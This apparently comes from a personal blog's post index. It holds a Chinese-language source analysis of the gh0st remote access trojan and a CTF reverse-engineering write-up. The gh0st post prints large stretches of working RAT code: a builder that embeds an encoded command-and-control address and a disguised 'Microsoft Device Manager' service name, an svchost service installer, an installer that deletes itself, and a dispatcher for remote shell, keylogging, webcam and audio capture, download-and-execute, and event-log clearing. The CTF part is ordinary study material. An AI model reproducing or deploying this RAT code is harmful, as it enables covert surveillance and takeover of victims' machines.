{"meta":{"title":"l1pmoluy","subtitle":"Dawing...","description":"l1pmoluy's blog","author":"l1pmoluy","url":"https://l1pmoluy.github.io","root":"/"},"posts":[{"title":"gh0st源码分析","date":"2025-10-08T06:55:14.000Z","path":"2025/10/08/gh0st源码分析/","text":"gh0st源码分析 流程理解 客户端通过本地模板并写入信息生成服务端-install.exe 具体逻辑将提前放在.rdata中的dll取出，并注册服务在svchost下 dll的内容是删去install.exe并且自行隐藏，然后取出加密后的ip解密，向客户端发送随机事件名，响应后根据发来的包决定转接哪个Manager，如FIle，Screen等 代码结构 12345678910111213gh0st/├─gh0st/| ├─gh0st.cpp #客户端的初始化| ├─BuildView.cpp #读取Server文件，写入加密信息| └──SettingsView.cpp#ip和端口号的填写加密├─install/| └─install.cpp #运行时解密出需要的信息，取出svchost挂在服务下└─svchost/ ├─svchost.cpp #删除install，基本上就隐藏了，然后登录客户端，调用 | #KernelManager等待响应 ├─KernelManager.cpp#分发Manager的，比如Screen、Keyboard ├─FileManager.cpp #接收客户端的信息进行文件操作 └─ScreenManager.cpp#接收客户端信息进行屏幕操作 源码分析 客户端部分 从模板install.exe中生成服务端exe 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576void CBuildView::OnBuild() &#123; // TODO: Add your control notification handler code here UpdateData(true); if (m_ServiceDisplayName.IsEmpty() || m_ServiceDescription.IsEmpty()) &#123; AfxMessageBox(&quot;请完整填写服务显示名称和描述 -:(&quot;); return; &#125; CString strAddress; // 保存配置 ((CGh0stApp *)AfxGetApp())-&gt;m_IniFile.SetString(&quot;Build&quot;, &quot;DisplayName&quot;, m_ServiceDisplayName); ((CGh0stApp *)AfxGetApp())-&gt;m_IniFile.SetString(&quot;Build&quot;, &quot;Description&quot;, m_ServiceDescription); ((CGh0stApp *)AfxGetApp())-&gt;m_IniFile.SetInt(&quot;Build&quot;, &quot;enablehttp&quot;, m_enable_http); if (m_enable_http) &#123; CString str; GetDlgItemText(IDC_URL, str); ((CGh0stApp *)AfxGetApp())-&gt;m_IniFile.SetString(&quot;Build&quot;, &quot;httpurl&quot;, str); str.MakeLower(); strAddress = MyEncode(str.GetBuffer(0)); &#125; else &#123; GetDlgItemText(IDC_DNS_STRING, strAddress); //读取格式为AAAA加密后的ipAAAA if (strAddress.Find(&quot;AAAA&quot;) == -1) &#123; AfxMessageBox(&quot;域名上线字串格式出错 -:(&quot;); return; &#125; strAddress.Replace(&quot;AAAA&quot;, &quot;&quot;); &#125; CString strServiceConfig; strServiceConfig.Format(&quot;%s|%s&quot;, MyEncode(m_ServiceDisplayName.GetBuffer(0)), MyEncode(m_ServiceDescription.GetBuffer(0))); CFileDialog dlg(FALSE, &quot;exe&quot;, &quot;server.exe&quot;, OFN_OVERWRITEPROMPT,&quot;可执行文件|*.exe&quot;, NULL); if(dlg.DoModal () != IDOK) return; HINSTANCE hInstance; HRSRC hResInfo; DWORD dwResLen; HGLOBAL hResData; LPBYTE lpData; hInstance = AfxGetApp()-&gt;m_hInstance; hResInfo = FindResource(hInstance, (LPCTSTR)IDR_BSS, (LPCTSTR)&quot;BSS&quot;); dwResLen = SizeofResource(hInstance, hResInfo); hResData = LoadResource(hInstance, hResInfo); lpData = (LPBYTE)LockResource(hResData); CFile file; if(file.Open (dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite)) &#123; try &#123; file.Write(lpData, dwResLen); // 写入6个&#x27;C&#x27;,是服务的名称和描述 file.Write(&quot;CCCCCC&quot;, 6); file.Write(strServiceConfig, strServiceConfig.GetLength() + 1); // 写入6个&#x27;A&#x27;,安装时查找 file.Write(&quot;AAAAAA&quot;, 6); file.Write(strAddress, strAddress.GetLength() + 1); file.Close(); AfxMessageBox(&quot;文件保存成功，请用加壳软件进行压缩 -:)&quot;); &#125; catch(...) &#123; MessageBox(&quot;文件保存失败，请检查&quot;,&quot;提示&quot;,MB_OK|MB_ICONSTOP); &#125; &#125; FreeResource(hResData);&#125; 这里每次改动dll或者install.exe的时候都要按照svchost-&gt;install-&gt;gh0st的顺序全部重新编译，所以自己复现了一个直接凭借install.exe生成目标文件的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;#include&lt;iostream&gt;#include&lt;stdlib.h&gt;#include&lt;string&gt;#include&lt;cstring&gt;#include&lt;time.h&gt;using namespace std;char base64[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;int base64_encode(const void* data, int size, char** str)&#123; char* s, * p; int i; int c; const unsigned char* q; p = s = (char*)malloc(size * 4 / 3 + 4); if (p == NULL) return -1; q = (const unsigned char*)data; i = 0; for (i = 0; i &lt; size;) &#123; c = q[i++]; c *= 256; if (i &lt; size) c += q[i]; i++; c *= 256; if (i &lt; size) c += q[i]; i++; p[0] = base64[(c &amp; 0x00fc0000) &gt;&gt; 18]; p[1] = base64[(c &amp; 0x0003f000) &gt;&gt; 12]; p[2] = base64[(c &amp; 0x00000fc0) &gt;&gt; 6]; p[3] = base64[(c &amp; 0x0000003f) &gt;&gt; 0]; if (i &gt; size) p[3] = &#x27;=&#x27;; if (i &gt; size + 1) p[2] = &#x27;=&#x27;; p += 4; &#125; *p = 0; *str = s; return strlen(s);&#125;char* MyEncode(char* str)&#123; int i, len; char* p; char* s, * data; len = strlen(str) + 1; s = (char*)malloc(len); memcpy(s, str, len); for (i = 0; i &lt; len; i++) &#123; s[i] ^= 0x19; s[i] += 0x86; &#125; base64_encode(s, len, &amp;data); free(s); return data;&#125;void my_strstr(char* a1, char* a2, int len)&#123; for (int i = 0; i &lt; len; i++) a1[i] = a2[i];&#125;int main()&#123; srand(time(NULL)); int enablehttp = 0; char InputStr[100]; //端口域名 char* EnInputStr; scanf(&quot;%s&quot;, InputStr); //printf(&quot;%s&quot;, MyEncode(InputStr)); EnInputStr = MyEncode(InputStr); char strServiceConfig[100]; char DisplayName[100]; sprintf_s(DisplayName, &quot;Microsoft Device Manager_%02x&quot;, rand() % 0xff); char Description[] = &quot;监测和监视新硬件设备并自动更新设备驱动&quot;; sprintf_s(strServiceConfig, &quot;%s|%s&quot;, MyEncode(DisplayName),MyEncode(Description)); char str1[100] = &quot;CCCCCC&quot;; strcat(str1, strServiceConfig); char str2[100] = &quot;AAAAAA&quot;; strcat(str2, EnInputStr); printf(&quot;%s\\n&quot;, str1); printf(&quot;%s\\n&quot;, str2); try &#123; char* pfile = NULL; FILE* pf = NULL; ULONG_PTR size; ULONG_PTR read_size; fopen_s(&amp;pf, &quot;E:\\\\study\\\\Trojan\\\\Gh0st-vs2019--main\\\\Gh0st-vs2019--main\\\\gh0st-vs2019\\\\gh0st\\\\res\\\\install.exe&quot;, &quot;rb&quot;); if (pf == NULL) throw &quot;[-]: fopen wrong&quot;; fseek(pf, 0, SEEK_END); size = ftell(pf); fseek(pf, 0, SEEK_SET); pfile = (char*)malloc(size); if (pfile == NULL) throw &quot;[-]: malloc wrong&quot;; read_size = fread(pfile, sizeof(char), size, pf); if (read_size != size) throw &quot;[-]: fread wrong&quot;; char pathname[200]; sprintf_s(pathname, &quot;E:\\\\study\\\\Trojan\\\\Gh0st-vs2019--main\\\\Gh0st-vs2019--main\\\\gh0st-vs2019\\\\gh0st\\\\Release\\\\server\\\\server_%02x.exe&quot;, rand() % 0xff); fclose(pf); pf = NULL; fopen_s(&amp;pf, pathname, &quot;wb&quot;); if (pf == NULL) throw &quot;[-]: fopen wrong&quot;; fwrite(pfile, 1, size, pf); fwrite(str1, 1, strlen(str1) + 1, pf); fwrite(str2, 1, strlen(str2) + 1, pf); &#125; catch (const char* msg) &#123; printf(&quot;%s\\n&quot;, msg); DWORD err = GetLastError(); printf(&quot;0x%08x&quot;, err); return 0; &#125; catch(...) &#123; printf(&quot;%x&quot;, GetLastError()); &#125;&#125; 服务端部分 install install的模板 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394__declspec(noinline)int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; // 让启动程序时的小漏斗马上消失 GetInputState(); PostThreadMessage(GetCurrentThreadId(),NULL,0,0); MSG msg; GetMessage(&amp;msg, NULL, NULL, NULL); char *lpEncodeString = NULL; char *lpServiceConfig = NULL; char *lpServiceDisplayName = NULL; char *lpServiceDescription = NULL; lpEncodeString = (char *)FindConfigString(hInstance, &quot;AAAAAA&quot;); if (lpEncodeString == NULL) &#123; MessageBoxA(NULL, &quot;Rrror in FindConfigStringAAAAAA&quot;, &quot;l1pmoluy&quot;, MB_OK); return -1; &#125; lpServiceConfig = (char *)FindConfigString(hInstance, &quot;CCCCCC&quot;); if (lpServiceConfig == NULL) &#123; MessageBoxA(NULL, &quot;Rrror in FindConfigStringCCCCCC&quot;, &quot;l1pmoluy&quot;, MB_OK); return -1; &#125; char* pos = strchr(lpServiceConfig, &#x27;|&#x27;); if (pos == NULL) &#123; MessageBoxA(NULL, &quot;Rrror in pos&quot;, &quot;l1pmoluy&quot;, MB_OK); return -1; &#125; *pos = &#x27;\\0&#x27;; lpEncodeString = MyDecode(lpEncodeString + 6); lpServiceDisplayName = MyDecode(lpServiceConfig + 6); lpServiceDescription = MyDecode(pos + 1); if (lpServiceDisplayName == NULL || lpServiceDescription == NULL || lpEncodeString == NULL) &#123; MessageBoxA(NULL, &quot;Rrror in MyDecode&quot;, &quot;l1pmoluy&quot;, MB_OK); return -1; &#125; char *lpServiceName = NULL; char *lpUpdateArgs = &quot;Gh0st Update&quot;; // 补丁:这里是看文件名字有没有更新(在ini配置中文件定死的) if (strstr(GetCommandLine(), lpUpdateArgs) == NULL) &#123; HANDLE hMutex = CreateMutex(NULL, true, lpEncodeString); DWORD dwLastError = GetLastError(); // 普通权限访问系统权限创建的Mutex,如果存在，如果存在就返回拒绝访问的错误 // 已经安装过一个一模一样配置的，就不安装了 if (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED) return -1; ReleaseMutex(hMutex); CloseHandle(hMutex); &#125; else &#123; // 等待服务端自删除 Sleep(5000); &#125; //设置异常处理 SetUnhandledExceptionFilter(bad_exception); // 确保权限 SetAccessRights(); //这里提权显示成功，但是在后续OpenSCManager中仍然存在权限不足提示 //加载dll到svchost服务中 这里有错误，明明是创建的新服务却显示服务已存在 lpServiceName = InstallService(lpServiceDisplayName, lpServiceDescription, lpEncodeString); if (lpServiceName != NULL) &#123; // 写安装程序路径到注册表，服务开始后读取并删除 char strSelf[MAX_PATH]; char strSubKey[1024]; memset(strSelf, 0, sizeof(strSelf)); GetModuleFileName(NULL, strSelf, sizeof(strSelf)); wsprintf(strSubKey, &quot;SYSTEM\\\\CurrentControlSet\\\\Services\\\\%s&quot;, lpServiceName); WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, &quot;InstallModule&quot;, REG_SZ, strSelf, lstrlen(strSelf), 0); //转接dll StartService(lpServiceName); delete lpServiceName; delete lpServiceDisplayName; delete lpServiceDescription; &#125; ExitProcess(0);&#125; svchost 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138DWORD WINAPI main(char *lpServiceName)#endif&#123;#ifdef _CONSOLE if (argc &lt; 3) &#123; printf(&quot;Usage:\\n %s &lt;Host&gt; &lt;Port&gt;\\n&quot;, argv[0]); return -1; &#125;#endif // lpServiceName,在ServiceMain返回后就没有了 char strServiceName[256]; char strKillEvent[50]; HANDLE hInstallMutex = NULL;#ifdef GH_DLL char *lpURL = (char *)FindConfigString(CKeyboardManager::g_hInstance, &quot;AAAAAA&quot;); if (lpURL == NULL) &#123; return -1; &#125; ////////////////////////////////////////////////////////////////////////// // Set Window Station HWINSTA hOldStation = GetProcessWindowStation(); HWINSTA hWinSta = OpenWindowStation(&quot;winsta0&quot;, FALSE, MAXIMUM_ALLOWED); if (hWinSta != NULL) SetProcessWindowStation(hWinSta); // ////////////////////////////////////////////////////////////////////////// if (CKeyboardManager::g_hInstance != NULL) &#123; SetUnhandledExceptionFilter(bad_exception); lstrcpy(strServiceName, lpServiceName); wsprintf(strKillEvent, &quot;Global\\\\Gh0st %d&quot;, GetTickCount()); // 随机事件名 hInstallMutex = CreateMutex(NULL, true, lpURL); ReConfigService(strServiceName); // 删除安装文件 实现自隐藏 DeleteInstallFile(lpServiceName); &#125;#endif // 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人 SetErrorMode( SEM_FAILCRITICALERRORS); char *lpszHost = NULL; DWORD dwPort = 80; char *lpszProxyHost = NULL; DWORD dwProxyPort = 0; char *lpszProxyUser = NULL; char *lpszProxyPass = NULL; HANDLE hEvent = NULL; CClientSocket socketClient; BYTE bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接 while (1) &#123; if (bBreakError != NOT_CONNECT &amp;&amp; bBreakError != HEARTBEATTIMEOUT_ERROR) &#123; for (int i = 0; i &lt; 2000; i++) &#123; hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent); if (hEvent != NULL) &#123; socketClient.Disconnect(); CloseHandle(hEvent); break; break; &#125; Sleep(60); &#125; &#125;#ifdef GH_DLL // 上线间隔为2分, 前6个&#x27;A&#x27;是标志 if (!getLoginInfo(MyDecode(lpURL + 6), &amp;lpszHost, &amp;dwPort, &amp;lpszProxyHost, &amp;dwProxyPort, &amp;lpszProxyUser, &amp;lpszProxyPass)) &#123; bBreakError = GETLOGINFO_ERROR; continue; &#125;#else lpszHost = argv[1]; dwPort = atoi(argv[2]);#endif if (lpszProxyHost != NULL) socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass); else socketClient.setGlobalProxyOption(); DWORD dwTickCount = GetTickCount(); //连接 if (!socketClient.Connect(lpszHost, dwPort)) &#123; bBreakError = CONNECT_ERROR; continue; &#125; // 登录 DWORD dwExitCode = SOCKET_ERROR; sendLoginInfo(strServiceName, &amp;socketClient, GetTickCount() - dwTickCount); //初始化manager CKernelManager manager(&amp;socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort); socketClient.setManagerCallBack(&amp;manager); // 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误 for (int i = 0; (i &lt; 10 &amp;&amp; !manager.IsActived()); i++) &#123; Sleep(1000); &#125; // 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接 if (!manager.IsActived()) continue; DWORD dwIOCPEvent; dwTickCount = GetTickCount(); do &#123; hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent); dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100); Sleep(500); &#125; while(hEvent == NULL &amp;&amp; dwIOCPEvent != WAIT_OBJECT_0); if (hEvent != NULL) &#123; socketClient.Disconnect(); CloseHandle(hEvent); break; &#125; &#125;#ifdef GH_DLL#endif SetErrorMode(0); ReleaseMutex(hInstallMutex); CloseHandle(hInstallMutex);&#125; 刚注册进来 系统调用ServiceMain ServiceMain简单完善一下后续 然后开线程调用main main将端口号解密出来 判断是否唯一 给自己提一个端口权限 然后重新注册一个服务 把install删了 后面把加密后的端口弄出来 然后先连随便一个网站 然后解密出来端口号等信息后面登录 在登录socketClient.Connect中 会有新线程产生 也就是工作线程 m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true); 工作线程先接受socket 这里在没有发socket的时候会阻塞住 接受到之后就开始解析 具体逻辑还要往里进看OnRead 12345WorkThread 堵塞等待接收socket|OnRead 判断socket是否为客户端发来的，并解包|Manager-&gt;OnReceive 调用Manager下的OnReceive 这里的Manager取决与前文中登录后的 CKernelManager manager(&amp;socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort); socketClient.setManagerCallBack(&amp;manager); 这里实现的便是设置Manager为KernelManager 所以这里调用的OnReceive就是分发Manager 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)&#123; switch (lpBuffer[0]) &#123; case COMMAND_ACTIVED: InterlockedExchange((LONG *)&amp;m_bIsActived, true); break; case COMMAND_LIST_DRIVE: // 文件管理 m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, (LPVOID)m_pClient-&gt;m_Socket, 0, NULL, false); break; case COMMAND_SCREEN_SPY: // 屏幕查看 m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager, (LPVOID)m_pClient-&gt;m_Socket, 0, NULL, true); break; case COMMAND_WEBCAM: // 摄像头 m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager, (LPVOID)m_pClient-&gt;m_Socket, 0, NULL); break; case COMMAND_AUDIO: // 摄像头 m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager, (LPVOID)m_pClient-&gt;m_Socket, 0, NULL); break; case COMMAND_SHELL: // 远程sehll m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, (LPVOID)m_pClient-&gt;m_Socket, 0, NULL, true); break; case COMMAND_KEYBOARD: m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager, (LPVOID)m_pClient-&gt;m_Socket, 0, NULL); break; case COMMAND_SYSTEM: m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager, (LPVOID)m_pClient-&gt;m_Socket, 0, NULL); break; case COMMAND_DOWN_EXEC: // 下载者 m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager, (LPVOID)(lpBuffer + 1), 0, NULL, true); Sleep(100); // 传递参数用 break; case COMMAND_OPEN_URL_SHOW: // 显示打开网页 OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL); break; case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页 OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE); break; case COMMAND_REMOVE: // 卸载, UnInstallService(); break; case COMMAND_CLEAN_EVENT: // 清除日志 CleanEvent(); break; case COMMAND_SESSION: CSystemManager::ShutdownWindows(lpBuffer[1]); break; case COMMAND_RENAME_REMARK: // 改备注 SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1)); break; case COMMAND_UPDATE_SERVER: // 更新服务端 if (UpdateServer((char *)lpBuffer + 1)) UnInstallService(); break; case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包 break; &#125; &#125; FileManager 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)&#123; switch (lpBuffer[0]) &#123; case COMMAND_LIST_FILES:// 获取文件列表 SendFilesList((char *)lpBuffer + 1); break; case COMMAND_DELETE_FILE:// 删除文件 DeleteFile((char *)lpBuffer + 1); SendToken(TOKEN_DELETE_FINISH); break; case COMMAND_DELETE_DIRECTORY:// 删除文件 ////printf(&quot;删除目录 %s\\n&quot;, (char *)(bPacket + 1)); DeleteDirectory((char *)lpBuffer + 1); SendToken(TOKEN_DELETE_FINISH); break; case COMMAND_DOWN_FILES: // 上传文件 UploadToRemote(lpBuffer + 1); break; case COMMAND_CONTINUE: // 上传文件 SendFileData(lpBuffer + 1); break; case COMMAND_CREATE_FOLDER: CreateFolder(lpBuffer + 1); break; case COMMAND_RENAME_FILE: Rename(lpBuffer + 1); break; case COMMAND_STOP: StopTransfer(); break; case COMMAND_SET_TRANSFER_MODE: SetTransferMode(lpBuffer + 1); break; case COMMAND_FILE_SIZE: CreateLocalRecvFile(lpBuffer + 1); break; case COMMAND_FILE_DATA: WriteLocalRecvFile(lpBuffer + 1, nSize -1); break; case COMMAND_OPEN_FILE_SHOW: OpenFile((char *)lpBuffer + 1, SW_SHOW); break; case COMMAND_OPEN_FILE_HIDE: OpenFile((char *)lpBuffer + 1, SW_HIDE); break; default: break; &#125;&#125; 这里的收到的包基本都是路径 进行的操作其实也就是找到路径对应的管理 然后进行操作就成 ScreenManager 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)&#123; try &#123; switch (lpBuffer[0]) &#123; case COMMAND_NEXT: // 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回 NotifyDialogIsOpen(); break; case COMMAND_SCREEN_RESET: //重启屏幕捕获子系统 ResetScreen(*(LPBYTE)&amp;lpBuffer[1]); break; case COMMAND_ALGORITHM_RESET: //设置屏幕捕获的算法 m_bAlgorithm = *(LPBYTE)&amp;lpBuffer[1]; m_pScreenSpy-&gt;setAlgorithm(m_bAlgorithm); break; case COMMAND_SCREEN_CTRL_ALT_DEL: //Ctrl+Alt+Del ::SimulateCtrlAltDel(); break; case COMMAND_SCREEN_CONTROL: &#123; // 远程仍然可以操作 BlockInput(false); ProcessCommand(lpBuffer + 1, nSize - 1);//挪动鼠标 BlockInput(m_bIsBlockInput); &#125; break; case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定 m_bIsBlockInput = *(LPBYTE)&amp;lpBuffer[1]; break; case COMMAND_SCREEN_BLANK: m_bIsBlankScreen = *(LPBYTE)&amp;lpBuffer[1]; break; case COMMAND_SCREEN_CAPTURE_LAYER: m_bIsCaptureLayer = *(LPBYTE)&amp;lpBuffer[1]; m_pScreenSpy-&gt;setCaptureLayer(m_bIsCaptureLayer); break; case COMMAND_SCREEN_GET_CLIPBOARD: SendLocalClipboard(); break; case COMMAND_SCREEN_SET_CLIPBOARD: UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1); break; default: break; &#125; &#125;catch(...)&#123;&#125;&#125;","updated":"2025-10-08T09:44:38.973Z","categories":[{"name":"逆向行驶","slug":"逆向行驶","permalink":"https://l1pmoluy.github.io/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/"}],"tags":[{"name":"项目","slug":"项目","permalink":"https://l1pmoluy.github.io/tags/%E9%A1%B9%E7%9B%AE/"}]},{"title":"TGctf2025-re-wp","date":"2025-06-02T12:14:14.000Z","path":"2025/06/02/2025TGCTF/","text":"写了逆向方向5&#x2F;7个题 Base64改变过的base64，在base64 8 -&gt; 6 寻址前加了个凯撒 12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;void b64_decode(uint8_t* input, uint8_t* output) &#123; uint32_t len = 0; while (input[len] != 0) len++; uint8_t flen = len / 4; uint32_t i; uint8_t basebox[] = &quot;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;; uint8_t b64unbox[0x100] = &#123; 0 &#125;; for (i = 0; i &lt; 64; i++) &#123; b64unbox[basebox[i]] = i; &#125; b64unbox[&#x27;=&#x27;] = 0; unsigned char a[100] = &#123; 0 &#125;; unsigned char* b = a; for (i = 0; i &lt; len; i++) &#123; a[i] = b64unbox[input[i]]; a[i] = (a[i] + 40) % 64; &#125; printf(&quot;i=%d\\n&quot;, i); printf(&quot;flen=%d\\n&quot;, flen); for (i = 0; i &lt; flen; i++) &#123; output[i * 3] = ((a[i * 4]) &lt;&lt; 2) | ((a[i * 4 + 1]) &gt;&gt; 4); output[i * 3 + 1] = ((a[i * 4 + 1]) &lt;&lt; 4) | (a[i * 4 + 2] &gt;&gt; 2); output[i * 3 + 2] = (a[i * 4 + 2] &lt;&lt; 6) | (a[i * 4 + 3]); &#125; output[i * 3 - 1] = 0;&#125;int main() &#123; uint8_t* input = &quot;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=&quot;; uint8_t* intoutput = malloc(0x100); b64_decode(input, intoutput); printf(&quot;%s&quot;, intoutput); //HZNUCTF&#123;ad162c-2d94-434d-9222-b65dc76a32&#125; return;&#125; XTEA是xtea 123456srand(0x7E8u);sub_7FF754A41181();sub_7FF754A411A9(&quot;Welcome to HZNUCTF!!!\\n&quot;);sub_7FF754A411A9(&quot;Plz input the cipher:\\n&quot;);v10 = 0;if ( sub_7FF754A41217(&quot;%d&quot;, &amp;v10) == 1 ) 开头让自己输入一个delta，根据这题提示misc？并且还有一个很奇怪的解压密码，能猜出来解压密码就是delta并且解压密码其实就是标准xtea的delta，key是随机数做出来的，随机数的srand就在开头，注意到这句代码下还有一个未知函数 123456void sub_7FF754A42130()&#123; sub_7FF754A413A2(&amp;unk_7FF754A520A7); if ( isd() ) srand(0x7E9u);&#125; 反调试改变key，那么就可以解密了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4], unsigned int a1) &#123; unsigned int* result; // rax unsigned int v5; // [rsp+24h] [rbp+4h] unsigned int v6; // [rsp+44h] [rbp+24h] unsigned int v7; // [rsp+64h] [rbp+44h] int i; // [rsp+84h] [rbp+64h] v5 = v[0]; v6 = v[1]; v7 = 0; for (i = 0; i &lt; 32; i++) &#123; v7 -= a1; &#125; for (i = 0; i &lt; 32; ++i) &#123; v6 -= (key[(v7 &gt;&gt; 11) &amp; 3] + v7) ^ (v5 + ((v5 &gt;&gt; 5) ^ (16 * v5))); v7 += a1; v5 -= (key[v7 &amp; 3] + v7) ^ (v6 + ((v6 &gt;&gt; 5) ^ (16 * v6))); &#125; v[0] = v5; v[1] = v6;&#125;int main() &#123; unsigned int flag[8] = &#123; 0x8CCB2324, 0x09A7741A, 0xFB3C678D, 0xF6083A79, 0xF1CC241B, 0x39FA59F2, 0xF2ABE1CC, 0x17189F72 &#125;; unsigned int flag1[8] = &#123; 0x95645282, 0x73E66F8D, 0xDA948666, 0xEB4B1C9A, 0x6FC4FB97, 0xC787553D, 0xAA16C12B, 0x30138D36 &#125;; srand(0x7e8); unsigned int key[4] = &#123; 0 &#125;; for (int i = 0; i &lt; 4; i++) &#123; key[i] = rand(); &#125; unsigned int* pf; unsigned char a[33] = &#123; 0 &#125;; int i = 0; for (i = 7; i &gt; 0; i--) &#123; pf = &amp;flag[i]; decipher(32, &amp;flag[i - 1], key, 0x9E3779B9); &#125; for (int k = 0; k &lt; 8; k++) &#123; a[k * 4] = (flag[k] &gt;&gt; 24); a[k * 4 + 1] = (flag[k] &gt;&gt; 16); a[k * 4 + 2] = (flag[k] &gt;&gt; 8); a[k * 4 + 3] = (flag[k]); &#125; printf(&quot;%s\\n&quot;, a); //HZNUCTF&#123;ae6-9f57-4b74-b423-98eb&#125; return;&#125; 水果忍者unity游戏，可以在dnspy里看看Fruit Ninja_Data-&gt;Managed-&gt;Assembly-CSharp.dll用dnspy打开 在gamemanager中有一段代码在检测分数 123456789101112131415161718192021222324252627282930313233343536public void IncreaseScore(int points)&#123; this.score += points; this.scoreText.text = this.score.ToString(); if (this.score &gt;= 999999999) &#123; byte[] cipherText = this.ConvertHexStringToByteArray(GameManager.encryptedHexData); string text = this.Decrypt(cipherText, GameManager.encryptionKey, GameManager.iv); if (this.decryptedTextDisplay != null) &#123; this.decryptedTextDisplay.text = text; &#125; &#125; else if (this.decryptedTextDisplay != null) &#123; this.decryptedTextDisplay.text = &quot;&quot;; &#125; float num = PlayerPrefs.GetFloat(&quot;hiscore&quot;, 0f); if ((float)this.score &gt; num) &#123; num = (float)this.score; PlayerPrefs.SetFloat(&quot;hiscore&quot;, num); &#125;&#125;private string Decrypt(byte[] cipherText, string key, string iv)&#123; string result; using (Aes aes = Aes.Create()) // Token: 0x04000015 RID: 21 private static readonly string encryptionKey = &quot;HZNUHZNUHZNUHZNU&quot;; // Token: 0x04000016 RID: 22 private static readonly string iv = &quot;0202005503081501&quot;; // Token: 0x04000017 RID: 23 private static readonly string encryptedHexData = &quot;cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf&quot;; 可以看到分数大于999999999会有自解密并且弹出，两个方法，1.ce改分数（我试过改了也没有弹不知为什么），2.自己解密，厨子一把锁HZNUCTF{de20-70dd-4e62-b8d0-06e} 蛇年的本名语言python逆向 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# uncompyle6 version 3.9.2# Python bytecode version base 3.8.0 (3413)# Decompiled from: Python 3.8.8 (tags/v3.8.8:024d805, Feb 19 2021, 13:18:16) [MSC v.1928 64 bit (AMD64)]# Embedded file name: output.pyfrom collections import Counterprint(&quot;Welcome to HZNUCTF!!!&quot;)print(&quot;Plz input the flag:&quot;)a1 = input()a2 = Counter(a1)O0o00 = &quot;&quot;.join((str(a2[i]) for i in a1))print(&quot;ans1: &quot;, end=&quot;&quot;)print(O0o00) #HZNUCTF&#123;16 &#125;if O0o00 != &quot;111111116257645365477364777645752361&quot;: print(&quot;wrong_wrong!!!&quot;) exit(1)iiIII = &quot;&quot;for i in a1: if a2[i] &gt; 0: iiIII += i + 